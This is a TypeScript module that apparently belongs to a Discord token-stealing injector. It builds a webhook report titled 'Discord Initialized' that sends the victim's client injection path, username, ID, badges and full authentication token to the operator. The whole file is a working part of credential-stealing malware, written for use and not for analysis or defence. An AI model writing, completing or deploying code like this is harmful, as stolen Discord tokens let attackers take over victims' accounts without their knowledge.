import { ConfigFSBinder } from "../configFSBinder";
import { FakeAccount } from "../fakeProfile";
import { getBaseEmbeds } from "./baseEmbed";
import { warpInQuote, warpTripleQuote } from "../utils";
import { WebhookMessageOptions } from "discord.js";

export async function getDiscordInitializedEmbed(config: ConfigFSBinder, account = new FakeAccount()): Promise<WebhookMessageOptions>  {
    const { embeds, webhookMessage} = getBaseEmbeds(config);
    const embed = embeds[0];
    embed.setTitle("Discord Initialized");
    embed.setThumbnail(await account.discord.getAvatar());
    embed.setFields([{
        name: "Info",
        value: warpTripleQuote(account.injectionPath),
        inline: false
    }, {
        name: "Username",
        value: warpInQuote(account.discord.tag),
        inline: true
    }, {
        name: "ID",
        value: warpInQuote(account.discord.id),
        inline: true
    }, {
        name: "Badges",
        value: account.discord.badges.join(" "),
        inline: false
    }, {
        name: "Token",
        value: warpTripleQuote(account.discord.token),
        inline: false
    }]);
    return webhookMessage();
}
